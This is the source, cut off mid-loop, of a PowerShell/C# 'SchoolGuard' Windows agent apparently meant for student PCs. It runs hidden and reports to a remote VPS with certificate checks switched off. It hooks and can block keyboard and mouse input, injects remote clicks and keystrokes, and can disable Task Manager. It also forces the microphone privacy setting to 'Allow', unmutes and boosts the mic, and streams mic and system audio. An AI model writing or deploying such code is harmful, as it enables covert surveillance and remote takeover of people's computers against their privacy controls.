# ============================================================================
# SchoolGuard Windows Agent (Zero-Dependency .NET / PowerShell)
# Runs 100% hidden in background on Windows 7/10/11 (No Python required)
# Connects to VPS: wss://103-149-172-179.sslip.io/ws/agent (fallback ws://:4000)
# ============================================================================
$ErrorActionPreference = "SilentlyContinue"

$createdNew = $false
for ($mRetry = 0; $mRetry -lt 12; $mRetry++) {
    $Global:SingleInstanceMutex = New-Object System.Threading.Mutex($true, "Local\SchoolGuardWindowsAgentMutexV2", [ref]$createdNew)
    if ($createdNew) { break }
    try { $Global:SingleInstanceMutex.Close(); $Global:SingleInstanceMutex.Dispose() } catch {}
    Start-Sleep -Milliseconds 300
}
if (-not $createdNew) {
    exit 0
}

$csharpCode = @"
using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Microsoft.Win32;

public static class WinGuardSecurity {
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();

    [DllImport("shcore.dll")]
    private static extern int SetProcessDpiAwareness(int value);

    [DllImport("user32.dll")]
    private static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("gdi32.dll")]
    private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

    public static void EnableTls() {
        try { SetProcessDpiAwareness(2); } catch {}
        try { SetProcessDPIAware(); } catch {}
        try {
            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(
                delegate (object s, X509Certificate c, X509Chain ch, SslPolicyErrors e) { return true; }
            );
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
        } catch {}
    }

    public static int[] GetPhysicalScreenSize(int fallbackW, int fallbackH) {
        int w = fallbackW > 0 ? fallbackW : 1920;
        int h = fallbackH > 0 ? fallbackH : 1080;
        IntPtr hdc = IntPtr.Zero;
        try {
            hdc = GetDC(IntPtr.Zero);
            if (hdc != IntPtr.Zero) {
                int dw = GetDeviceCaps(hdc, 118); // DESKTOPHORZRES
                int dh = GetDeviceCaps(hdc, 117); // DESKTOPVERTRES
                int lw = GetDeviceCaps(hdc, 8);   // HORZRES
                int lh = GetDeviceCaps(hdc, 10);  // VERTRES
                if (dw > w) w = dw;
                if (dh > h) h = dh;
                if (lw > w) w = lw;
                if (lh > h) h = lh;
            }
        } catch {}
        finally {
            if (hdc != IntPtr.Zero) {
                try { ReleaseDC(IntPtr.Zero, hdc); } catch {}
            }
        }
        return new int[] { w, h };
    }
    public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    [StructLayout(LayoutKind.Sequential)]
    public struct KBDLLHOOKSTRUCT {
        public uint vkCode;
        public uint scanCode;
        public uint flags;
        public uint time;
        public IntPtr dwExtraInfo;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct POINT {
        public int x;
        public int y;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct MSLLHOOKSTRUCT {
        public POINT pt;
        public uint mouseData;
        public uint flags;
        public uint time;
        public IntPtr dwExtraInfo;
    }

    private static HookProc _proc = HookCallback;
    private static HookProc _mouseProc = MouseHookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static IntPtr _mouseHookID = IntPtr.Zero;
    public static bool BlockKb = false;
    public static bool BlockMouse = false;

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool BlockInput(bool fBlockIt);

    [DllImport("user32.dll")]
    public static extern bool SetForegroundWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern bool SetCursorPos(int X, int Y);

    [DllImport("user32.dll")]
    public static extern void mouse_event(uint dwFlags, int dx, int dy, int dwData, UIntPtr dwExtraInfo);

    [DllImport("user32.dll")]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool GetSystemTimes(out ulong lpIdleTime, out ulong lpKernelTime, out ulong lpUserTime);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct MEMORYSTATUSEX {
        public uint dwLength;
        public uint dwMemoryLoad;
        public ulong ullTotalPhys;
        public ulong ullAvailPhys;
        public ulong ullTotalPageFile;
        public ulong ullAvailPageFile;
        public ulong ullTotalVirtual;
        public ulong ullAvailVirtual;
        public ulong ullAvailExtendedVirtual;
    }

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);

    [DllImport("kernel32.dll")]
    private static extern ulong GetTickCount64();

    private static ulong _prevIdle = 0;
    private static ulong _prevTotal = 0;
    private static int _lastCpu = 8;

    public static int GetCpuPercent() {
        try {
            ulong idle, kernel, user;
            if (GetSystemTimes(out idle, out kernel, out user)) {
                ulong total = kernel + user;
                ulong diffIdle = idle - _prevIdle;
                ulong diffTotal = total - _prevTotal;
                _prevIdle = idle;
                _prevTotal = total;
                if (diffTotal > 0 && _prevTotal > diffTotal) {
                    int pct = (int)(100UL * (diffTotal - diffIdle) / diffTotal);
                    if (pct < 0) pct = 0;
                    if (pct > 100) pct = 100;
                    _lastCpu = pct;
                }
            }
        } catch {}
        return _lastCpu;
    }

    public static double[] GetMemoryMetrics() {
        try {
            MEMORYSTATUSEX mem = new MEMORYSTATUSEX();
            mem.dwLength = (uint)Marshal.SizeOf(typeof(MEMORYSTATUSEX));
            if (GlobalMemoryStatusEx(ref mem)) {
                double totalGb = Math.Round(mem.ullTotalPhys / (1024.0 * 1024.0 * 1024.0), 1);
                double usedGb = Math.Round((mem.ullTotalPhys - mem.ullAvailPhys) / (1024.0 * 1024.0 * 1024.0), 1);
                return new double[] { (double)mem.dwMemoryLoad, usedGb, totalGb };
            }
        } catch {}
        return new double[] { 0, 0, 0 };
    }

    public static long GetUptimeSeconds() {
        try {
            return (long)(GetTickCount64() / 1000UL);
        } catch {
            return 0;
        }
    }

    public static void SyncInputHooks(bool lockKb, bool lockMouse) {
        BlockKb = lockKb;
        BlockMouse = lockMouse;
        try {
            if (lockKb && _hookID == IntPtr.Zero) {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule) {
                    _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            } else if (!lockKb && _hookID != IntPtr.Zero) {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }
            if (lockMouse && _mouseHookID == IntPtr.Zero) {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule) {
                    _mouseHookID = SetWindowsHookEx(14, _mouseProc, GetModuleHandle(curModule.ModuleName), 0);
                }
            } else if (!lockMouse && _mouseHookID != IntPtr.Zero) {
                UnhookWindowsHookEx(_mouseHookID);
                _mouseHookID = IntPtr.Zero;
            }
        } catch {}
    }

    public static void InstallHook() {
        BlockKb = true;
        BlockMouse = true;
    }

    public static void UninstallHook() {
        BlockKb = false;
        BlockMouse = false;
    }

    public static void RemoteMouse(string act, double xr, double yr, string btn, int wheelDelta, int sw, int sh, int sl, int st) {
        try {
            if (sw <= 0) sw = 1920;
            if (sh <= 0) sh = 1080;
            int x = sl + (int)Math.Round(Math.Max(0.0, Math.Min(1.0, xr)) * (sw - 1));
            int y = st + (int)Math.Round(Math.Max(0.0, Math.Min(1.0, yr)) * (sh - 1));
            SetCursorPos(x, y);
            bool isRight = (btn == "right");
            bool isMid = (btn == "middle");
            if (act == "down") {
                uint f = isRight ? 0x0008u : (isMid ? 0x0020u : 0x0002u);
                mouse_event(f, 0, 0, 0, UIntPtr.Zero);
            } else if (act == "up") {
                uint f = isRight ? 0x0010u : (isMid ? 0x0040u : 0x0004u);
                mouse_event(f, 0, 0, 0, UIntPtr.Zero);
            } else if (act == "click") {
                uint f = isRight ? (0x0008u | 0x0010u) : (isMid ? (0x0020u | 0x0040u) : (0x0002u | 0x0004u));
                mouse_event(f, 0, 0, 0, UIntPtr.Zero);
            } else if (act == "contextmenu") {
                mouse_event(0x0008u | 0x0010u, 0, 0, 0, UIntPtr.Zero);
            } else if (act == "dblclick") {
                mouse_event(0x0002u | 0x0004u, 0, 0, 0, UIntPtr.Zero);
                System.Threading.Thread.Sleep(35);
                mouse_event(0x0002u | 0x0004u, 0, 0, 0, UIntPtr.Zero);
            } else if (act == "wheel") {
                mouse_event(0x0800u, 0, 0, wheelDelta, UIntPtr.Zero);
            }
        } catch {}
    }

    public static void RemoteKeyVk(byte vk, bool ctrl, bool alt, bool shift, bool win = false) {
        try {
            if (vk == 0) return;
            if (win) keybd_event(0x5B, 0, 0, UIntPtr.Zero);
            if (ctrl) keybd_event(0x11, 0, 0, UIntPtr.Zero);
            if (alt) keybd_event(0x12, 0, 0, UIntPtr.Zero);
            if (shift) keybd_event(0x10, 0, 0, UIntPtr.Zero);
            keybd_event(vk, 0, 0, UIntPtr.Zero);
            keybd_event(vk, 0, 0x0002u, UIntPtr.Zero);
            if (shift) keybd_event(0x10, 0, 0x0002u, UIntPtr.Zero);
            if (alt) keybd_event(0x12, 0, 0x0002u, UIntPtr.Zero);
            if (ctrl) keybd_event(0x11, 0, 0x0002u, UIntPtr.Zero);
            if (win) keybd_event(0x5B, 0, 0x0002u, UIntPtr.Zero);
        } catch {}
    }

    public static void SetTaskMgrDisabled(bool disabled) {
        try {
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")) {
                if (key != null) {
                    if (disabled) {
                        key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                    } else {
                        key.DeleteValue("DisableTaskMgr", false);
                    }
                }
            }
        } catch {}
    }

    // ========================================================================
    // Two-Way Real-Time Audio Engine (16kHz 16-bit Mono PCM + Hot-Plugging)
    // ========================================================================
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct WAVEFORMATEX {
        public ushort wFormatTag;
        public ushort nChannels;
        public uint nSamplesPerSec;
        public uint nAvgBytesPerSec;
        public ushort nBlockAlign;
        public ushort wBitsPerSample;
        public ushort cbSize;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct WAVEHDR {
        public IntPtr lpData;
        public uint dwBufferLength;
        public uint dwBytesRecorded;
        public IntPtr dwUser;
        public uint dwFlags;
        public uint dwLoops;
        public IntPtr lpNext;
        public IntPtr reserved;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct WAVEINCAPS {
        public ushort wMid;
        public ushort wPid;
        public uint vDriverVersion;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
        public string szPname;
        public uint dwFormats;
        public ushort wChannels;
        public ushort wReserved1;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct WAVEOUTCAPS {
        public ushort wMid;
        public ushort wPid;
        public uint vDriverVersion;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
        public string szPname;
        public uint dwFormats;
        public ushort wChannels;
        public ushort wReserved1;
        public uint dwSupport;
    }

    [DllImport("winmm.dll")]
    public static extern uint waveInGetNumDevs();
    [DllImport("winmm.dll", CharSet = CharSet.Auto)]
    public static extern int waveInGetDevCaps(IntPtr uDeviceID, out WAVEINCAPS pwic, uint cbwic);
    [DllImport("winmm.dll")]
    public static extern int waveInOpen(out IntPtr phwi, uint uDeviceID, ref WAVEFORMATEX pwfx, IntPtr dwCallback, IntPtr dwInstance, uint fdwOpen);
    [DllImport("winmm.dll")]
    public static extern int waveInPrepareHeader(IntPtr hwi, IntPtr pwh, uint cbwh);
    [DllImport("winmm.dll")]
    public static extern int waveInUnprepareHeader(IntPtr hwi, IntPtr pwh, uint cbwh);
    [DllImport("winmm.dll")]
    public static extern int waveInAddBuffer(IntPtr hwi, IntPtr pwh, uint cbwh);
    [DllImport("winmm.dll")]
    public static extern int waveInStart(IntPtr hwi);
    [DllImport("winmm.dll")]
    public static extern int waveInReset(IntPtr hwi);
    [DllImport("winmm.dll")]
    public static extern int waveInClose(IntPtr hwi);

    [DllImport("winmm.dll")]
    public static extern uint waveOutGetNumDevs();
    [DllImport("winmm.dll", CharSet = CharSet.Auto)]
    public static extern int waveOutGetDevCaps(IntPtr uDeviceID, out WAVEOUTCAPS pwoc, uint cbwoc);
    [DllImport("winmm.dll")]
    public static extern int waveOutOpen(out IntPtr phwo, uint uDeviceID, ref WAVEFORMATEX pwfx, IntPtr dwCallback, IntPtr dwInstance, uint fdwOpen);
    [DllImport("winmm.dll")]
    public static extern int waveOutPrepareHeader(IntPtr hwo, IntPtr pwh, uint cbwh);
    [DllImport("winmm.dll")]
    public static extern int waveOutUnprepareHeader(IntPtr hwo, IntPtr pwh, uint cbwh);
    [DllImport("winmm.dll")]
    public static extern int waveOutWrite(IntPtr hwo, IntPtr pwh, uint cbwh);
    [DllImport("winmm.dll")]
    public static extern int waveOutReset(IntPtr hwo);
    [DllImport("winmm.dll")]
    public static extern int waveOutClose(IntPtr hwo);
    [DllImport("winmm.dll")]
    public static extern int waveOutGetVolume(IntPtr hwo, out uint dwVolume);
    [DllImport("winmm.dll")]
    public static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume);

    // ========================================================================
    // WASAPI Core Audio COM Interfaces (Loopback System Audio + Mic + Volume)
    // ========================================================================
    [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
    private class MMDeviceEnumeratorComObject { }

    [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IMMDeviceEnumerator {
        int EnumAudioEndpoints(int dataFlow, int dwStateMask, out IntPtr ppDevices);
        int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppEndpoint);
    }

    [ComImport, Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IMMDevice {
        int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, [MarshalAs(UnmanagedType.IUnknown)] out object ppInterface);
    }

    [ComImport, Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IAudioClient {
        int Initialize(int ShareMode, int StreamFlags, long hnsBufferDuration, long hnsPeriodicity, IntPtr pFormat, IntPtr AudioSessionGuid);
        int GetBufferSize(out uint pNumBufferFrames);
        int GetStreamLatency(out long phnsLatency);
        int GetCurrentPadding(out uint pNumPaddingFrames);
        int IsFormatSupported(int ShareMode, IntPtr pFormat, out IntPtr ppClosestMatch);
        int GetMixFormat(out IntPtr ppDeviceFormat);
        int GetDevicePeriod(out long phnsDefaultDevicePeriod, out long phnsMinimumDevicePeriod);
        int Start();
        int Stop();
        int Reset();
        int SetEventHandle(IntPtr eventHandle);
        int GetService(ref Guid riid, [MarshalAs(UnmanagedType.IUnknown)] out object ppv);
    }

    [ComImport, Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IAudioCaptureClient {
        int GetBuffer(out IntPtr ppData, out uint pNumFramesToRead, out uint pdwFlags, out ulong pu64DevicePosition, out ulong pu64QPCPosition);
        int ReleaseBuffer(uint NumFramesRead);
        int GetNextPacketSize(out uint pNumFramesInNextPacket);
    }

    [ComImport, Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IAudioEndpointVolume {
        int RegisterControlChangeNotify(IntPtr pNotify);
        int UnregisterControlChangeNotify(IntPtr pNotify);
        int GetChannelCount(out uint pnChannelCount);
        int SetMasterVolumeLevel(float fLevelDB, ref Guid pguidEventContext);
        int SetMasterVolumeLevelScalar(float fLevel, ref Guid pguidEventContext);
        int GetMasterVolumeLevel(out float pfLevelDB);
        int GetMasterVolumeLevelScalar(out float pfLevel);
        int SetChannelVolumeLevel(uint nChannel, float fLevelDB, ref Guid pguidEventContext);
        int SetChannelVolumeLevelScalar(uint nChannel, float fLevel, ref Guid pguidEventContext);
        int GetChannelVolumeLevel(uint nChannel, out float pfLevelDB);
        int GetChannelVolumeLevelScalar(uint nChannel, out float pfLevel);
        int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, ref Guid pguidEventContext);
        int GetMute([MarshalAs(UnmanagedType.Bool)] out bool pbMute);
    }

    public static ConcurrentQueue<string> MicQueue = new ConcurrentQueue<string>();
    public static ConcurrentQueue<byte[]> SpkQueue = new ConcurrentQueue<byte[]>();
    public static volatile bool MicStreaming = false;
    public static volatile string AudioListenMode = "both"; // "both" | "system" | "mic"
    public static volatile int LastMicLevel = 0;
    public static volatile bool IsSpeakerMuted = false;
    public static volatile int SavedVolumePct = 85;
    private static Thread _micThread = null;
    private static Thread _spkThread = null;

    public static void EnsureMicPrivacyAllowed() {
        string[] subKeys = new string[] {
            "Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone",
            "Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged"
        };
        foreach (string sk in subKeys) {
            try {
                using (RegistryKey k = Registry.CurrentUser.CreateSubKey(sk)) {
                    if (k != null) k.SetValue("Value", "Allow", RegistryValueKind.String);
                }
            } catch {}
            try {
                using (RegistryKey k = Registry.LocalMachine.CreateSubKey(sk)) {
                    if (k != null) k.SetValue("Value", "Allow", RegistryValueKind.String);
                }
            } catch {}
        }
        // Also ensure Microphone endpoint is unmuted and at good volume in Windows Core Audio
        try {
            var enumerator = (IMMDeviceEnumerator)(new MMDeviceEnumeratorComObject());
            IMMDevice micDev;
            if (enumerator.GetDefaultAudioEndpoint(1, 0, out micDev) == 0 && micDev != null) {
                Guid iidVol = new Guid("5CDF2C82-841E-4546-9722-0CF74078229A");
                object objVol;
                if (micDev.Activate(ref iidVol, 23, IntPtr.Zero, out objVol) == 0 && objVol != null) {
                    var epVol = (IAudioEndpointVolume)objVol;
                    Guid empty = Guid.Empty;
                    epVol.SetMute(false, ref empty);
                    float curLvl = 1.0f;
                    if (epVol.GetMasterVolumeLevelScalar(out curLvl) == 0 && curLvl < 0.85f) {
                        epVol.SetMasterVolumeLevelScalar(0.95f, ref empty);
                    }
                    Marshal.ReleaseComObject(epVol);
                }
                Marshal.ReleaseComObject(micDev);
            }
            Marshal.ReleaseComObject(enumerator);
        } catch {}
    }

    public static object[] GetAudioStatus() {
        uint inDevs = 0;
        uint outDevs = 0;
        string micName = "Khong co Mic";
        string spkName = "Khong co Loa";
        int volPct = SavedVolumePct;
        try {
            inDevs = waveInGetNumDevs();
            if (inDevs > 0) {
                WAVEINCAPS ic;
                if (waveInGetDevCaps((IntPtr)0, out ic, (uint)Marshal.SizeOf(typeof(WAVEINCAPS))) == 0 && !string.IsNullOrEmpty(ic.szPname)) {
                    micName = ic.szPname;
                } else {
                    micName = "Default Microphone";
                }
            }
        } catch {}
        try {
            outDevs = waveOutGetNumDevs();
            if (outDevs > 0) {
                WAVEOUTCAPS oc;
                if (waveOutGetDevCaps((IntPtr)0, out oc, (uint)Marshal.SizeOf(typeof(WAVEOUTCAPS))) == 0 && !string.IsNullOrEmpty(oc.szPname)) {
                    spkName = oc.szPname;
                } else {
                    spkName = "Default Speaker";
                }
            }
            // Read real Windows Master Speaker Volume via WASAPI IAudioEndpointVolume
            bool gotWasapiVol = false;
            try {
                var enumerator = (IMMDeviceEnumerator)(new MMDeviceEnumeratorComObject());
                IMMDevice renderDev;
                if (enumerator.GetDefaultAudioEndpoint(0, 0, out renderDev) == 0 && renderDev != null) {
                    if (outDevs == 0) {
                        outDevs = 1;
                        spkName = "System Audio Output";
                    }
                    Guid iidVol = new Guid("5CDF2C82-841E-4546-9722-0CF74078229A");
                    object objVol;
                    if (renderDev.Activate(ref iidVol, 23, IntPtr.Zero, out objVol) == 0 && objVol != null) {
                        var epVol = (IAudioEndpointVolume)objVol;
                        float lvl;
                        bool muted;
                        if (epVol.GetMasterVolumeLevelScalar(out lvl) == 0) {
                            volPct = (int)Math.Round(lvl * 100.0);
                            if (volPct > 0) SavedVolumePct = volPct;
                            gotWasapiVol = true;
                        }
                        if (epVol.GetMute(out muted) == 0) {
                            IsSpeakerMuted = muted;
                        }
                        Marshal.ReleaseComObject(epVol);
                    }
                    Marshal.ReleaseComObject(renderDev);
                }
                Marshal.ReleaseComObject(enumerator);
            } catch {}

            if (!gotWasapiVol) {
                uint rawVol = 0xFFFF;
                if (waveOutGetVolume(IntPtr.Zero, out rawVol) == 0) {
                    int curPct = (int)Math.Round(((rawVol & 0xFFFF) / 65535.0) * 100.0);
                    if (!IsSpeakerMuted) {
                        volPct = curPct;
                        if (curPct > 0) SavedVolumePct = curPct;
                    }
                }
            }
        } catch {}
        return new object[] { inDevs > 0, micName, outDevs > 0, spkName, volPct, IsSpeakerMuted, MicStreaming, LastMicLevel, AudioListenMode };
    }

    public static void SetAudioVolume(int volumePct, bool muted) {
        try {
            if (volumePct >= 0 && volumePct <= 100) {
                SavedVolumePct = volumePct;
            }
            IsSpeakerMuted = muted;
            int effPct = muted ? 0 : SavedVolumePct;
            uint ch = (uint)Math.Max(0, Math.Min(65535, (int)Math.Round((effPct / 100.0) * 65535.0)));
            uint stereo = ch | (ch << 16);
            waveOutSetVolume(IntPtr.Zero, stereo);
        } catch {}
        try {
            var enumerator = (IMMDeviceEnumerator)(new MMDeviceEnumeratorComObject());
            IMMDevice renderDev;
            if (enumerator.GetDefaultAudioEndpoint(0, 0, out renderDev) == 0 && renderDev != null) {
                Guid iidVol = new Guid("5CDF2C82-841E-4546-9722-0CF74078229A");
                object objVol;
                if (renderDev.Activate(ref iidVol, 23, IntPtr.Zero, out objVol) == 0 && objVol != null) {
                    var epVol = (IAudioEndpointVolume)objVol;
                    Guid empty = Guid.Empty;
                    float scalar = (float)Math.Max(0.0, Math.Min(1.0, SavedVolumePct / 100.0));
                    epVol.SetMasterVolumeLevelScalar(scalar, ref empty);
                    epVol.SetMute(muted, ref empty);
                    Marshal.ReleaseComObject(epVol);
                }
                Marshal.ReleaseComObject(renderDev);
            }
            Marshal.ReleaseComObject(enumerator);
        } catch {}
    }

    public static void StartMicStream(string mode = "both") {
        if (!string.IsNullOrEmpty(mode)) {
            AudioListenMode = mode.ToLower();
        }
        EnsureMicPrivacyAllowed();
        MicStreaming = true;
        if (_micThread == null || !_micThread.IsAlive) {
            _micThread = new Thread(MicWorkerLoop);
            _micThread.IsBackground = true;
            _micThread.Start();
        }
    }

    public static void StopMicStream() {
        MicStreaming = false;
        LastMicLevel = 0;
        string dummy;
        while (MicQueue.TryDequeue(out dummy)) {}
    }

    public static string DequeueMicChunk() {
        string chunk;
        if (MicQueue.TryDequeue(out chunk)) return chunk;
        return null;
    }

    private static void DrainWasapiQueue(IAudioCaptureClient cap, ConcurrentQueue<short> targetQueue, byte[] scratch) {
        if (cap == null) return;
        try {
            uint packetFrames = 0;
            while (cap.GetNextPacketSize(out packetFrames) == 0 && packetFrames > 0) {
                IntPtr pData;
                uint framesRead, flags;
                ulong devPos, qpcPos;
                if (cap.GetBuffer(out pData, out framesRead, out flags, out devPos, out qpcPos) != 0) break;
                int byteCount = (int)(framesRead * 2);
                bool isSilent = (flags & 0x2) != 0; // AUDCLNT_BUFFERFLAGS_SILENT
                if (framesRead > 0) {
                    if (isSilent || pData == IntPtr.Zero) {
                        for (uint i = 0; i < framesRead; i++) {
                            if (targetQueue.Count < 16000) targetQueue.Enqueue(0);
                        }
                    } else {
                        if (byteCount <= scratch.Length) {
                            Marshal.Copy(pData, scratch, 0, byteCount);
                            for (int b = 0; b < byteCount - 1; b += 2) {
                                short s = (short)(scratch[b] | (scratch[b + 1] << 8));
                                if (targetQueue.Count < 16000) targetQueue.Enqueue(s);
                            }
                        }
                    }
                }
                cap.ReleaseBuffer(framesRead);
            }
        } catch {}
    }

    private static void MicWorkerLoop() {
        const int CHUNK_SAMPLES = 1600; // 100ms @ 16kHz
        const int CHUNK_BYTES = 3200;
        const int BUF_COUNT = 4;
        uint hdrSize = (uint)Marshal.SizeOf(typeof(WAVEHDR));

        while (MicStreaming) {
            EnsureMicPrivacyAllowed();
            IMMDeviceEnumerator enumerator = null;
            IMMDevice loopDev = null;
            IAudioClient loopClient = null;
            IAudioCaptureClient loopCap = null;

            IMMDevice micDev = null;
            IAudioClient micClient = null;
            IAudioCaptureClient micCap = null;

            IntPtr hWaveIn = IntPtr.Zero;
            IntPtr[] hdrPtrs = new IntPtr[BUF_COUNT];
            IntPtr[] dataPtrs = new IntPtr[BUF_COUNT];
            IntPtr pFmt = IntPtr.Zero;

            try {
                WAVEFORMATEX fmt = new WAVEFORMATEX {
                    wFormatTag = 1,
                    nChannels = 1,
                    nSamplesPerSec = 16000,
                    wBitsPerSample = 16,
                    nBlockAlign = 2,
                    nAvgBytesPerSec = 32000,
                    cbSize = 0
                };
                pFmt = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WAVEFORMATEX)));
                Marshal.StructureToPtr(fmt, pFmt, false);

                // 1. Initialize WASAPI Loopback (System Audio Output on Student PC: YouTube, Games, Music, Video)
                try {
                    enumerator = (IMMDeviceEnumerator)(new MMDeviceEnumeratorComObject());
                    if (enumerator.GetDefaultAudioEndpoint(0, 0, out loopDev) == 0 && loopDev != null) {
                        Guid iidAudioClient = new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
                        object objLoop;
                        if (loopDev.Activate(ref iidAudioClient, 23, IntPtr.Zero, out objLoop) == 0 && objLoop != null) {
                            loopClient = (IAudioClient)objLoop;
                            // LOOPBACK (0x00020000) | AUTOCONVERTPCM (0x80000000) | SRC_DEFAULT_QUALITY (0x08000000)
                            int loopFlags = unchecked((int)0x88020000);
                            if (loopClient.Initialize(0, loopFlags, 10000000, 0, pFmt, IntPtr.Zero) == 0) {
                                Guid iidCap = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
                                object objCap;
                                if (loopClient.GetService(ref iidCap, out objCap) == 0 && objCap != null) {
                                    loopCap = (IAudioCaptureClient)objCap;
                                    loopClient.Start();
                                }
                            }
                        }
                    }
                } catch {}

                // 2. Initialize WASAPI Capture (Microphone) with fallback to waveInOpen
                bool hasWasapiMic = false;
                try {
                    if (enumerator != null && enumerator.GetDefaultAudioEndpoint(1, 0, out micDev) == 0 && micDev != null) {
                        Guid iidAudioClient = new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
                        object objMic;
                        if (micDev.Activate(ref iidAudioClient, 23, IntPtr.Zero, out objMic) == 0 && objMic != null) {
                            micClient = (IAudioClient)objMic;
                            // AUTOCONVERTPCM (0x80000000) | SRC_DEFAULT_QUALITY (0x08000000)
                            int micFlags = unchecked((int)0x88000000);
                            if (micClient.Initialize(0, micFlags, 10000000, 0, pFmt, IntPtr.Zero) == 0) {
                                Guid iidCap = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
                                object objCap;
                                if (micClient.GetService(ref iidCap, out objCap) == 0 && objCap != null) {
                                    micCap = (IAudioCaptureClient)objCap;
                                    if (micClient.Start() == 0) {
                                        hasWasapiMic = true;
                                    }
                                }
                            }
                        }
                    }
                } catch {}

                if (!hasWasapiMic && waveInGetNumDevs() > 0) {
                    int rOpen = waveInOpen(out hWaveIn, 0xFFFFFFFFu, ref fmt, IntPtr.Zero, IntPtr.Zero, 0);
                    if (rOpen != 0 || hWaveIn == IntPtr.Zero) {
                        rOpen = waveInOpen(out hWaveIn, 0u, ref fmt, IntPtr.Zero, IntPtr.Zero, 0);
                    }
                    if (rOpen == 0 && hWaveIn != IntPtr.Zero) {
                        byte[] zeroHdr = new byte[(int)hdrSize];
                        for (int i = 0; i < BUF_COUNT; i++) {
                            dataPtrs[i] = Marshal.AllocHGlobal(CHUNK_BYTES);
                            hdrPtrs[i] = Marshal.AllocHGlobal((int)hdrSize);
                            Marshal.Copy(zeroHdr, 0, hdrPtrs[i], (int)hdrSize);
                            WAVEHDR h = new WAVEHDR { lpData = dataPtrs[i], dwBufferLength = CHUNK_BYTES };
                            Marshal.StructureToPtr(h, hdrPtrs[i], false);
                            waveInPrepareHeader(hWaveIn, hdrPtrs[i], hdrSize);
                            waveInAddBuffer(hWaveIn, hdrPtrs[i], hdrSize);
                        }
                        waveInStart(hWaveIn);
                    }
                }

                ConcurrentQueue<short> sysRing = new ConcurrentQueue<short>();
                ConcurrentQueue<short> micRing = new ConcurrentQueue<short>();
                byte[] scratch = new byte[65536];
                byte[] waveInTmp = new byte[CHUNK_BYTES];
                byte[] outBytes = new byte[CHUNK_BYTES];
                uint initInDevs = waveInGetNumDevs();
                uint initOutDevs = waveOutGetNumDevs();
